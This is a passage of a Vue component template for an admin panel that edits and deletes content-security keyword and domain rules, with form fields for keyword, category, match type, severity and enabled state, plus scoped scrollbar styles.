            type="button" 
            :disabled="isDeletingDomainRule"
            @click="closeDomainDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingDomainRule"
            @click="executeDeleteDomainRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingDomainRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingDomainRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT KEYWORD RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isEdit.value"
      :title="isKeywordDetailsLoading ? 'Loading Keyword Rule...' : (editingKeywordRuleId ? `Edit Keyword Rule #${editingKeywordRuleId}` : 'Edit Keyword Rule')"
      subtitle="Update pattern heuristics and classification parameters for this keyword rule."
      max-width="max-w-lg"
      @close="closeKeywordEditModal"
    >
      <!-- Loading State -->
      <div v-if="isKeywordDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving keyword rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateKeywordRule" class="p-6 space-y-4">
        <!-- Keyword -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Keyword <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="keywordEditForm.keyword"
            type="text" 
            placeholder="e.g. free crypto giveaway, telegram @, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="keywordEditForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="WORD">Word</option>
              <option value="SUBSTRING">Substring</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="keywordEditForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="keywordEditForm.description"
            rows="2"
            placeholder="Explain why this keyword is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="keywordEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingKeywordEdit"
            @click="closeKeywordEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingKeywordEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingKeywordEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingKeywordEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE KEYWORD RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="keywordModalState.isDelete.value"
      title="Delete Keyword Rule"
      subtitle="Verify decommissioning of this content security keyword rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingKeywordRule"
      @close="closeKeywordDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this keyword rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Rule <span class="font-mono font-bold text-foreground">{{ deletingKeywordRule?.keyword || (selectedKeywordRule ? selectedKeywordRule.keyword : `ID #${keywordModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="closeKeywordDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingKeywordRule"
            @click="executeDeleteKeywordRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingKeywordRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingKeywordRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>
  </div>
</template>

<style scoped>
.custom-scrollbar::-webkit-scrollbar {
  height: 4px;
}
.custom-scrollbar::-webkit-scrollbar-track {
  background: transparent;
}
.custom-scrollbar::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.2);
  border-radius: 10px;
}
.custom-scrollbar:hover::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.4);
}
</style>
